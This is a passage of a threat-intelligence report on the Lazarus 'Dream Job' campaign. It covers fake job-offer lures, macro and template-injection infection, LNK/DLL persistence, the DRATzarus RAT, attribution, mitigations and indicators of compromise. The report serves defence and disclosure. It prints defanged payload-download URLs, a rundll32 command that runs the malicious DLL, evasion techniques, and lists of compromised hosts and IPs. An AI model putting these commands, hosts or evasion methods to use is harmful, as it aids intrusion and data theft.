file that can adjust itself to each target, i.e. two different victims will see two different offers. Similarly to the other scenarios, in this one three files are installed on the target – the legitimate bait file (a PDF file containing the job description – the malicious PDF is deleted), the DLL file with the “.db” extension, and a LNK file for redundancy. Following is a screenshot from the PDF object, which shows the extraction of the legitimate file: As with the other bait files, this file too has different obfuscation mechanisms, for example XOR-ing the HEX: Using the PDFiD tool, we investigated the PDF file before and after loading it in the customized reader, i.e. the clean and the infected versions. As can be seen in the next picture, the number of objects has increased almost six-fold, and the number of streams has increased more than five-fold. Also, unlike the original file, an additional /ObjStm has was added to the new file, which enfolds the downloading of the files: Before After ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 26 | P a g e Operation ‘Dream Job’ Second infection scenario – DOC files In our assessment, based on lower sophistication compared to the first and the third scenarios, this is the earliest scenario used by the group. It can be estimated that the third scenario, which will be presented further on, is an expansion of this scenario. The files are named “Job Description” in this scenario; the victim receives a DOC file (as opposed to DOCX in the next scenario). After opening the file, the target is requested to run macro scripts by pressing “Enable Editing” – this will download the same three files described in the previous section. Following is an example of one of those macro commands, which calls the desktop.dat file (which is, as will be explained later, actually a DLL file): In this scenario, in contrast with the others, we have seen the DLL being dropped under the “.sys” expansion. We estimate that Lazarus uses this tactic to maintain persistence through a service and not only through the LNK shortcut. ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 27 | P a g e Operation ‘Dream Job’ Third infection scenario – DOTM files This scenario seems to be a more developed, expanded version of the second scenario and it employs several additional evasion techniques. In late July 2020, McAfee has reported on this scenario17. In this section, we will review the scenario and add our insights. First stage – the victim downloads form the storage server the archive file, which contains a DOCX-type file; the DOCX file uses template injection to connect to a breached server and download from there a JPG or PNG-type picture, which is actually a DOTM file. This maneuver allows the attackers to bypass corporate security solutions, as there is no apparent illegitimate activity: the original file only connects to a legitimate (albeit hacked) server to download a picture. The attackers store the files on the C2 server, while their (the files’) names are indicative of the company they try to impersonate, such as BAE Systems, Boeing, Lockheed Martin etc. Following are several examples of such tell-tale names: hxxps://www.geeks-board[.]com/images/themes/logo/boeing_gs_logo.jpg hxxps://www.fabianiarte[.]com/uploads/png/boeing_gs.png hxxps://www.paghera[.]com/img-head/thumb/lib/disney_dds_log.jpg The dotm file oftentimes contains between one and three pages, while the first page contains the impersonated company’s name and a title that suits the job offer, and the two other pages are sometimes seen (with no content) and sometimes not, and their content can only be viewed after clicking “Enable Editing”. Second stage – after downloading the DOTM file, the target is presented with a request to run a malicious macro, which is written in VBA and can only be ran by the target. Three additional files, which are loaded as DLLs and contacted by the macro, are wsuser.db, wsdts.db, and desktop.ini. Occasionally, we have seen the attackers guide the victim to “Enable Editing”, to run the macro. In some cases, even after running the macro the victim ran into some troubles, and the attackers took care of those. Generally, it can be said that the attackers are very communicative and helpful, showing will to guide and help the victim if any problems arise. Second Stage – LNK and DLL Files Once the initial infection process is complete (using one of the three mentioned methods), two types of files are deployed to the infected machine (in addition to the legitimate lure in the form of a job offer). 17 mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-a-job-offer-thats-too-good-to-be-true/ ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 28 | P a g e Operation ‘Dream Job’ • The first file is an LNK, meaning a shortcut file, designed to establish persistence on the infected machine and enable re-installation in case the malware is removed. • The second file is a DLL library that deploys the malware itself. This chapter will detail the DLL’s main components. The LNK File When the file is activated, the DLL on the machine is executed anew. The file extensions are mostly .db, but ClearSky analysts have identified a .sys extension for a file located in a singular incident, named PCAudit.sys. we estimate that when the attackers wish to run the DLL as a service, they utilize the .sys file instead of .db. Presenting the relevant code segments to the DLL execution (using the mentioned shortcut): DBLL Dropper Once the malicious DLL is deployed, the attackers install a designated RAT on the infected network. All of the DLLs used can detect whether they are on the correct network at the time of activation, and do not activate if the lure file is opened in a different network, or a mobile device. The tools also use various systems to detect Sandbox or VMware services. ClearSky analysts located two types of libraries during our investigation, the first intended for 64-bit systems, and the second for 32-bit. We named these files “Dropper DBLL”, as the extensions are mostly .db. During our research we observed the LNK’s capability to deploy these files. ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 29 | P a g e Operation ‘Dream Job’ Each file is packed using Packer Themida, evident from the _+CTRL string: The file is downloaded to varying folders on the infected machine. For example: C:\ProgramData\ThumbNail\thumbnail.db C:\ProgramData\desktop.ini The file is executed using rundll32.exe, similarly to the process of establishing persistence that sets the path to which the DLL is unloaded using the CtrlPanel function: C:\windows\system32\rundll32.exe ""C:\ProgramData\ThumbNail\thumbnail.db"", CtrlPanel S-6-81- 3811-75432205-060098-6872 0 0 905 1 We identified a plethora of obfuscation and concealment systems in this file, designed to avoid virtual machines or various Sandbox services. These systems allow the attackers to remain “under the radar” of security mechanisms and penetrate the organization, for example VMprotect. These methods, in addition to the infection and social engineering processes, evidence a high level of effort put in to avoiding identification or detection. If the DLL detects an unwanted domain, or a mobile device file activation, it does not activate. Further details regarding these files are available in a recent McAfee research. Third and Fourth Stages General Overview The DLL unloads several PE EXE files, designated to install a group-developed Trojan Access Remote. During the preliminary research, we identified many resemblances to Bankshot, another self- developed RAT that was uncovered in 2018 by the US government18. The resemblances diminished as following files were identified. During the course of researching companies which were attacked, we observed the successful installation of hacking tool in two cases, meaning that the Trojan was able to exfiltrate data from the infected computers. The installed files only operate using specific parameters, which made the investigation much more challenging. Technical Analysis Three actions related to the RAT installation are performed at this stage: • An EXE bearing the name of a general-purpose software is unloaded, operating as the Dropper for the RAT. 18 us-cert.cisa.gov/sites/default/files/publications/MAR-10135536-B_WHITE.PDF ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 30 | P a g e Operation ‘Dream Job’ • The RAT itself is deployed. • A variant of the RAT that is capable of additional operations is also deployed. Initially, a preliminary EXE is unloaded, bearing an innocuous name such as IExplorer.exe and packed using UPX. This file has a single designation, which is to deploy two additional files. The first is the RAT and the second is designed to be a backup on the machine in addition to a few other operations. The RAT is sometimes named Flash.exe. We named this RAT DRATzarus. The IExplorer file impersonates a legitimate Explorer client: The file’s code is meager, yet encompasses many detection avoidance techniques, as detailed: • Sleep: the capability to remotely shut down the tool or automatically shutting it down locally under specific conditions. • IsDebuggerPresent: this is one of the most familiar Anti-Debug functions in the API Calls category. The infected machine is examined using API for specific flags in PEB that are designed to detect whether a Debugger is present, and if a debugging process was initiated (common in Sandbox systems). • GetTickCount: another Anti-Debug function that conducts function timing, meaning measuring the time necassery for different operations. In case of an elongated process time, the operations are halted to prevent their decryption. • GetSystemTimeAsFileTime: similar to GetTickCount. The code is also partly encrypted with XOR. ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 31 | P a g e Operation ‘Dream Job’ Please note that the file’s header is MZ, while the header PE appears after the XOR encryption, also signifying an executable: The file uses Invoker privileges instead of Admin or higher to install the RAT, using the next code segment: <requestedExecutionLevel level=""asInvoker"" uiAccess=""false""></requestedExecutionLevel> The RAT is unloaded to the desktop, according to the following PDB path located by ClearSky analysts: C:\Users\joe-user\Desktop\3zvQ751hQF.exe Our continued research of the files exposed a version of this RAT from 2019. Comparing the code, we located amongst the company’s clients with the code from Virus Total we identified at least 22 DIFF function results that attest to identical segments. Most of the code is identical apart from differing obfuscation systems. The RAT’s main operationality is to deploy additional attack tools, while these are partly open source and partly commodity software, to enable further activity on the infected machine. Seeing as previous iterations by the group did not utilize publicly available tools. Communication with the C2 is performed using HTTP or HTTPS protocols (ports 80 or 443) instead of DNS queries. When comparing the later files’ source code from GitHub it becomes apparent that it mostly congregates with the APT Lazarus: ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 32 | P a g e Operation ‘Dream Job’ The executable mostly does not perform lateral movement, focusing on initially examining and categorizing the infected machine. For example, the R table is scrutinized to detect whether the machine exists in the target domain and what other machines are connected to the network (including detecting whether other machines are accessible). Further examined details are whether Shell can be installed, which users exist on the infected machine, and an attempt to map the network is made. No fully active operations take place. During our research, we did not identify external to internal network movement (this includes the file’s inability to be installed on a removeable USB), however these capabilities are still in the realm of possibility. Fifth Stages – Additional Tools When we arrive at this phase, the attackers have installed the RAT and now have control of the infected machine. Unlike common Trojan Access Remote applications by the group, this scenario mainly entails deploying public files, partly open source and partly commodity software. Many of the files are taken from the NirSoft (an Israeli developer named Nir Sofer, that has developed dozens of different attack tools offered for free online) tool kit. Several examples: • Responder: an open source tool that is used for Poisoner mDNS/LLMNR/NBT-NS, which is downloadable from GitHub. The tool enables structured authentication of MSSQL servers19 amongst other capabilities. • Wake-On-Lan: a NirSoft tool that enables remotely turning machines on and off through sending a Wake-On-Lan package to a remote machine20. • ChromePass: a NirSoft tool that enables the extraction of credentials from Google Chrome21. It is apparent that these operations are performed after unsuccessfully attempting to conduct actions on the infected machine, and that the attackers are prepared to invest in attack tools in place of self- 19 github.com/SpiderLabs/Responder attack.mitre.org/software/S0174/ 20 nirsoft.net/utils/wake_on_lan.html 21 nirsoft.net/utils/chromepass.html ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 33 | P a g e Operation ‘Dream Job’ developing them (possibly in an effort to save development time, or lowered OPSEC at failed instances of attack). We identified that once the attackers take hold of the network, word searches are performed on the machine and in documents that deal in security or financial matters, which is also the source of our assessment of the scenario’s goals. ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 34 | P a g e Operation ‘Dream Job’ Attribution Introduction ‘Dream Job’ is an extensive attack infrastructure used in an operation against tens of targets the Middle East and worldwide in the past year. We affiliate the operation with high confidence to The Korean APT group Lazarus. The group has been actively targeting companies affiliated with the defense sector over the past few years. In 2019, ClearSky researchers revealed an attack attempt against an Israeli security company carried out by the group22. The attack was revealed by ClearSky researchers in collaboration with research colleagues, by affiliating an EML file containing a malicious attachment which was uploaded to VirusTotal by an employee of a sensitive security company in Israel. The attachment contained an archive RAR file vulnerable to a zero-day flaw. An investigation of the source code of the malicious file using the Intezer Malware Analysis engine revealed a great overlap with code used by Lazarus. ClearSky analysts have been monitoring the group activity since the exposure of this operation, which marked the first attack of a North Korean APT group against an Israeli target. In June 2020 ESET published a research whose findings aided our current investigation. In the following chapter, we will review the attribution of the attack group from several aspects – code overlap, operational similarities and, TTPs and victim profiles. Code Overlap Code overlap can be divided into two types – an overlap in the source code of the attack tools – as well as similarities to other attack tools used by the group – and in the attack methods used in this operation compared to previous ones. Source Code Overlap In 2019, a Lazarus campaign which focused on career job seekers was published and was dubbed ‘Falsified Job Recruitment’. A comparison between the source code of the dll files found during the investigation of the 2019 campaign, and those analyzed by our researchers in the current research, reveals a great similarity between the files. Additionally, over 11.5% of the source code of the RAT found during the current investigation is identical to a code commonly used by Lazarus. 22 haaretz.com/israel-news/business/.premium-north-korean-hackers-cited-in-rare-attack-in-israel-1.7059457 ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 35 | P a g e Operation ‘Dream Job’ One of the characteristics of the campaign covered in this report is the use of a packer – a tool designed to pack the source code for detection evasion – called Themida23. This packer is commonly used by Lazarus24 as well as sub-groups such as Andariel25. Although a packer available online can be used by multiple groups is appears that Lazarus uses the Themida packer regularly. Another similarity pointed out by ESET researchers is a source code similarity with the NukeSped tool, previously affiliated with Lazarus26. According to ESET, the headers and ‘code-flattening’ techniques identified in the 2019 campaign were also observed in several past campaigns27 and are similar to those of the NukeSped tool as well. Similarities to known Lazarus Attack Tools and Advancement of Known Attack Methods New Attack Techniques Revealed in July 2020 by McAfee, operation North Star revolved around one out of three of the attack methods presented in this report. McAfee researchers affiliated the North Star operation with the Lazarus APT based on the great similarity in the modus operandi of the operation to that of previous Lazarus campaigns researched by the company between 2017 and 2019. The greatest code overlap, however, can be observed in the Visual Basic code which forms the malicious macros in the first and second attack methods presented here, compared to that used in Lazarus campaigns between 2017 and 2019. 23 oreans.com/Themida.php 24 us-cert.cisa.gov/northkorea 25 global.ahnlab.com/global/upload/download/techreport/%5BAhnLab%5DAndariel_a_Subgroup_of_Lazarus% 20(3).pdf 26 fortinet.com/blog/threat-research/deep-analysis-nukesped-rat 27 securelist.com/mata-multi-platform-targeted-malware-framework/97746/ ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 36 | P a g e Operation ‘Dream Job’ Techniques, Tactics and Procedures During our investigation we uncovered several overlaps between the ‘Dream Job’ attack infrastructure and the Lazarus APT group. The similarities were found by comparing our findings to those of previous reports covering Lazarus APT activities, and to attack techniques used by group listed in the MITRE ATT&CK knowledge base. In 2018, a North Korean citizen was accused of acting as part of the attack group, while executing attacks against the defense sector via LinkedIn profiles among other means28. The use of LinkedIn by Lazarus as an attack vector was also mentioned by ESET in their last report reviewing the group. Another attack vector known to be in common use by the group and found on our investigation is the impersonation of airlines from all around the world, among them Boeing. These two vectors assist us in the affiliation the attack covered in this report to Lazarus with high confidence. In 2019 ClearSky researchers discovered an attack attempt by the North Korean group against an Israeli security company. During the operation, the attackers sent the victim a malicious RAR document called ‘SysAid-Documentation’ that contained an exploit of the vulnerability assigned CVE-2018-20250, associated with the group. A file called ‘Thumbs.db.lnk’ had also been revealed in that attack – the file was used to stabilize the group’s access to the victim company network. The overlap in the file names and types, as well as the victim company sector, are yet another proof of our attribution of the attack covered in this report to Lazarus. The following table summarizes all the overlapping TTPs between our findings and known techniques used by Lazarus covered in previous research: TTP ID – MITRE ATT&CK Name Use T1071.001 Application Layer Protocol: Web Protocols A Lazarus Group malware sample conducts C2 over HTTP. 28 justice.gov/opa/press-release/file/1092091/download ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 37 | P a g e Operation ‘Dream Job’ T1560.003 Archive via Custom Method A Lazarus Group malware sample encrypts data using a simple byte to based exfiltration. XOR operation prior T1547.009 T1543.003 T1564.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder A Lazarus Group malware sample adds persistence on the system by creating a shortcut in the user’s Startup folder. Create or Modify System Process: Windows Service Lazarus Group malware install themselves as new Several families services on victims. Hide Artifacts: Hidden Files and Directories A Lazarus Group VBA Macro sets its file attributes to System and Hidden T1055.001 Process Injection: Dynamic- A Lazarus Group malware sample link Library Injection performs reflective DLL injection. Target Sectors During the past few years, Lazarus has been actively attacking financial institutions such as cryptocurrency exchanges. In the last two years, the group has also been attacking companies affiliated with defense and aviation sectors. Lazarus is also the group behind the ‘Operation Sharpshooter’, a global campaign which targeted nuclear, defense, energy, and financial companies. According to McAfee, attack methods like those found during our investigation has been observed in use by the group in 2017 and 201929. In 2017 a campaign targeting job seekers has taken place. Based on these findings, we conclude that the targeted sectors in our research had also been under the group’s scope in previous campaigns. Although the prime goal of this campaign is espionage, it also has financial aspects. As mentioned in ESET report, the attackers leveraged the information obtained during the campaign to carry out targeted financial BEC fraud – Business Email Compromise – against the target companies’ employees and customers. During our investigation we observed that the attackers searched financial-related keyword in the infected machines – which means that also in this attack, a financial motivation has also influenced the group’s activities. 29 blog.talosintelligence.com/2019/01/fake-korean-job-posting.html ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 38 | P a g e Operation ‘Dream Job’ Summary and Insights About the Attacker 1. We estimate that ‘Dream Job’ operation is the primary campaign of Lazarus in 2020: in the past two months the North Korean group’s activity was uncovered in two reports reviewing its attack methods campaigns targeting job seekers. This attack infrastructure is used primarily for social engineering frauds tailored to the victim’s background. We believe that it is supported by tens of activists maintaining and infrastructure and relations with the victims. 2. Dual mission - Theft and Espionage: One of the top identifiers of Lazarus is their dual attack mission – money theft and espionage. This modus operandi is unique to North Korea, as other state actors usually focus on espionage only. North Korean money theft operations are carried out in service of the government, as a way of funding the nuclear program. 3. Advanced Social Engineering Techniques – The North Korean group has enhanced its operational toolset by establishing a new social engineering attack infrastructure. This infrastructure is quite sensitive, and even a single mistake can take down an operation, unlike a network access campaign, in which a vulnerability is exploited, which is generally a safer choice. The new infrastructure includes tens of fictitious profiles which are the product of extensive reconnaissance work. The group invested a lot of efforts in the creation of credible accounts, and it appears that in the past few months a significant upgrade has been observed in this arena. The group representatives have improved their English skills and are not afraid to communicate with its victims directly via WhatsApp texts or phone calls. However, we must note that the English level demonstrated by the attackers is far from perfect. 4. Information sharing – it is possible that “Lazarus” is targeting defense companies and sharing the data with other states, like Iran. Social engineering 1. Securing Home Environments – Employees working remotely from home, especially during quarantine due to the COVID-19 pandemic, poses new challenges for organizations aiming to preserve the same level of security even considering the changes. We estimate that attacks leveraging network vulnerabilities caused by the remote work will continue and increase. 2. Attacks leveraging LinkedIn –Lazarus has been leveraging the professional oriented social network as vector of attack. LinkedIn is an ideal attack platform when it comes to new career opportunities. It enables to attackers focus their efforts in their specific targets and create profiles tailored to lure the victims into communicating with the impostor. Due to its reputation, the use of LinkedIn provides reliability to the imposter profiles and enables easy collection of information about the victim’s professional background. ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 39 | P a g e Operation ‘Dream Job’ 3. LinkedIn profile Protection – we believe that LinkedIn has yet to develop sufficient security mechanisms and protect its users against impostor accounts. We find it alarming that a fictitious profile, copycat an existing account, can be open and use without alerting to source profile from which the information was stolen, as well as profiles contacted by the new imposter profile. Furthermore, the network does not initiate a validation process upon affiliating an account with a registered company or describing an account as belonging to a recruiter or a Human Resources expert. In the first stage of the fraud, Lazarus create a solid network of connections around the impostor’s profile thus establishing its credibility. It seems that for now, LinkedIn is ideal platform for professional imposter profiles. 4. Leveraging Global Corporates: impersonating profile connected to large defense companies, with thousands of employees, enabled the attackers an even easier way to gain the victim’s trust, as naturally, no-one can verify all of the corporate’s employees. 5. Bypass Corporate Protections – direct contact with employees via their personal profiles and private emails creates easy bypass of their company’s network protections, especially when using both environments on company computers. It enables North Korean Lazarus group to penetrate to sensitive corporate networks. 6. Employee Infection – a single infected employee can lead to the infection of the entire corporate network, risking the employee’s position in the company and generally, its professional reputation. ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 40 | P a g e Operation ‘Dream Job’ Recommendations Social Engineering The primary way to prevent social engineering attacks, is to raise awareness and doubt messages received from unknown profiles or email senders. We provide several methods for the detection and prevention of social engineering attack, specially “dream job” operations: 1. Avoid receiving and opening documents containing job descriptions: we recommend that the information about position will provided to you via a link to a professional career portal, rather than as a document which could potentially be leveraged for infection. We also recommend cross-referencing the information provided to you with the company’s official website. 2. Take extra caution when using LinkedIn: we encourage you to thoroughly review the profile of the person with whom you are in contact, verify that they indeed work for the company they represent and search for similar profiles with a higher level of credibility. We recommend receiving job offers only from verified company-affiliated accounts – make sure that the company listed in the profile is not misspelled (e.g. ‘The Boeing Company’ instead of the correct spelling – ‘Boeing’). 3. Refrain from providing your personal information – phone number and email address in particular – prior to the verification of the person which reached out to you. 4. Malicious documents – when opening the malicious file sent by Lazarus, the victim can only view the first page and to access the rest of the document, they must enable content, enable macro, or install a PDF reader. When coming across a document with similar features, please be alarmed and do not enable the content. 5. Self-Expression Level – When receiving a job offer or application, we must expect a standard level of expression which is in line with the person’s country of origin and position in the company. In the ‘Dream Job’ operation we noticed that despite the high credibility of the accounts, the impostors’ level of expression was lower then expected, which indicates that this is not their native language. Attack Mitigation 1. Consider disabling file download from private email accounts to company machines when the employee is connected to the company network. Additionally, try to avoid access to personal email accounts on machines connected to the company network. We recommend forbidding employees to access ‘WhatsApp Web’ as well as any other web-client of instant messaging application from company machines who can access sensitive resources. 2. Examine the communication between desktop Office software and external servers to locate any template injection attack attempts. Additionally, disable automatic file downloads from external servers. ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 41 | P a g e Operation ‘Dream Job’ 3. Install EDR software (Endpoint Detection and Response) and monitor the unloading of LNK and DLL files from other files on a machine under attack. In addition, monitor the DLL files stored on the machine to prevent DLL injection attacks. If a suspicious DLL file is found, you can examine its last modification time – if the update time is recent, it means it had been replaced. Lastly, monitor files running by the rundll32.exe application. 4. Disable LNK files is possible, as can reference any original file, folder or application. 5. Disable macros in all document files. 6. Do not enable the download and install of any unverified PDF reader from any unknown website. Furthermore, we recommend forbidding employees from installing .exe files on their company machines or downloading such files without the approval of an IT expert. 7. Any file downloaded from a storage service must be downloaded to a designated testing environment and scanned prior to its transfer to the organizational network. 8. We recommend using a variety of tools simulating a virtual environment, as many malicious files cease their activity when such environment is detected on the machine. 9. Do now allow the download of ISO files. ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 42 | P a g e Operation ‘Dream Job’ Indicators of Compromise Hashes Hash File Name Uploads to Virus Type 48405332ee067cdf29077b317dc7c555 First Infection Method Boeing_GS.pdf BDS_SETI_SE.pdf 8e9c5eca1726511e8710c9692127ca11 InternalViewer.exe 38032A4D12D9E3029F00B120200E8E68 8b78558ff2731e8f0904f660a02813c0 InternalViewer2.exe f7de7d878835793ae439c5e551597b1e Total from significant countries - - - Initial file Modified PDF Reader Modified PDF Reader 09350e100a4bda4a276fca6a968eb9ea BAE_HPC_SE.iso Zero detections ISO file 4E1B36182482644F5A377F3351F19118 BAE_HPC_SE.pdf D4B4BA4615C5FF58C766B509C552EC9D BAE_HPC_SE.pdf f31ce3215945b7f5978404eca30bdfc8 BAE_2020_JD_SSE.pdf 50e33e4d9229286e7d49c5b468fef285 - - Russia – Zero detections Initial PDF file Malicious PDF Malicious PDF Second Infection Method 74ebd77a8a2c3a50d615d92dcae9f620c244e742d 21e47a4cd605c89067365d4 Job Description.doc 60cbd093ac6f68443bed4dc2310b3252a0a5a5b55 dfb42dcd7ed220066d76b05 Job Description.doc Third Infection Method 35b07d0eddc357d7c388e819239595b2 BGS_SrMS.docx Ab7e59391ecf059f4394a22faabbbcb0 Boeing_Leader_SSI.docx f01624ec3f19b171cee5250eec53ffc2 Boeing_GS.docx 3f051bb43a168e83c5ad222b324ebf68 BGS_SrMS-1.docx - - - - 0be6e64e2310e9a4f5782b9e98cdaf72 Boeing_PMS.docx Israel 183ad96b931733ad37bb627a958837db - Initial file - Initial file Initial file Initial file Initial file Initial file Initial File De991e1dc8de2510127dcf9919f58f8a BEA_DEFENSE_LEAD.docx Israel Initial File de991e1dc8de2510127dcf9919f58d8a 306310e0d2c0a497d968be1120b05143 BAE_ECS_EPM.docx - 9ea365c1714eb500e5f4a749a3ed0fe7 Boeing_DSS_SE.docx e7aa0237fc3db67a96ebd877806a2c88 Boeing_AERO_GS.docx e7fc03267e47814e23e004e5f3a1205b Boeing_Russia_AA.docx Russia - - Initial file Initial file Initial file Initial file ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 43 | P a g e Operation ‘Dream Job’ Hash File Name Uploads to Virus Type Total from significant countries 66ad3ce8d5a3ba4f1d3ce39e7c4d7387 tete.docx - Initial file e77e72c8fae55aa60ff145a16a2f3b31 beoing_gs.png a5b8233855259c2b592b1ffc6b90f92f boeing_gs_logo.jpg 0071b20d27a24ae1e474145b8efc9718 17.dotm fb5c30397d1586a435326472b90d32da disney_dds_log.jpg 34f83ff7b0a1d05aaf8f81c9803a3a02 83878C91171338902E0FE0FB97A8 C47A.dotm a213f5b68c1f00cf781a4a968cdf4850 b_r_205699.jpg 9c703b1f9337fc960dd6029d2c3e156d 21it-23792.jpg.emi 6d05be441fdfc9a3b7ee7a6c2d416f49 1.dotm 980d6c8bdcd52b3dfa9573e3d4dd21e5 250ef467e32b6a169e93464237bb6b28 Boeing_Russia_AA.docx - - 6a20ddf3962fa0e25fd858918eb408d8 86a56df0f2aecabbeebeab8f519d4a4a 9f8e210b43a329903c08b8673add61aa 08F35BC3BCFCC1DC5F026A6954BA0FF2 42c55160ac29a6146617eaf0499b0c2011aa951a89 51bb18264403380795c03f 1203374a0266396e5a33f898af3f6dff LNK files thumbnail.lnk Iconcache.db Desktop.dat OneNote.lnk DBLL Dropper D382caafd100f28e5f9e769d41805f2158972070a14 a72768ac7e6dcb5c7e115 PCAudit.sys CA6658852480C70118FEBA12EB1BE880 thumbnail.db 1e5ca25dab653acfb4f356f0aca42f66 zlibwapi.dll thumbnaul.db DRATzarus - - - - - - - - - - - - DOTM file DOTM file DOTM file DOTM file DOTM file DOTM file DOTM file - DOTM file China Decoy file - legitimate - Decoy file - legitimate - Decoy file - legitimate First Vector Second Vector Third Vector Second Vector Third Vector Third Vector 42738d1824e5158a114a50bc07e12e8c iexplore.exe a3de22b6a8f4f9c7f77fc3901c9763d2 7bb93be636b332d0a142ff11aedb5bf0ff56deabba 3aa02520385bc99258406f Flash.exe South Korea First Stage RAT - Second Stage RAT ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 44 | P a g e Operation ‘Dream Job’ Hash File Name Uploads to Virus Type Total from significant countries 1b585bb4c361542792f4c3f48417b6025473a3d4de 5626459708a42f61aef63e Netsvc.exe - Second Stage RAT C2 Compromised Addresses The following domains were successfully accessed by the attack group to be used as malware download websites: Compromised domain Server colasprint[.]com speed-stream[.]com kyungrok[.]com roit.co[.]kr warevalley[.]com ktri.or[.]kr ilhak.co[.]kr polyboatowners[.]com kbcwainwrightchallenge.org[.]uk djasw.or[.]kr americanhotboats[.]com shinwonbook.co[.]kr server2.urgentfury[.]net 50.192.28[.]29 118.217.183[.]180 110.45.138[.]98 112.175.226[.]221 110.10.189[.]166 1.251.44[.]118 101.0.115[.]80 217.69.41[.]33 114.207.112[.]202 54.39.64[.]114 211.115.65[.]71 51.79.44[.]111 s17643226.onlinehome-server[.]info 212.227.91[.]36 jikyung.co[.]kr hansung-cc.co[.]kr au-pair.org fabianiarte[.]com scimpex[.]com automercado.co[.]cr ns3145204.ip-51-68-119[.]eu 211.202.2[.]195 115.23.252[.]233 212.227.91[.]36 51.68.119[.]230 103.227.176[.]20 54.241.91[.]49 51.68.119[.]230 reverse-31-186-8-221.turkicaret[.]net 31.186.8[.]221 kmdia.or[.]kr 210.217.137[.]70 ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 45 | P a g e Operation ‘Dream Job’ ClearSky Cyber Security Intelligence Report 2020 (C)All rights reserved to ClearSky Security Ltd. TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction. ____________________________________________________________________________________________________ www.clearskysec.com © All rights reserved to ClearSky Cyber Security ltd. 2020 TLP: White – Information is provided to the recipient only, and may not be distributed outside the initial exchange 46 | P a g e"
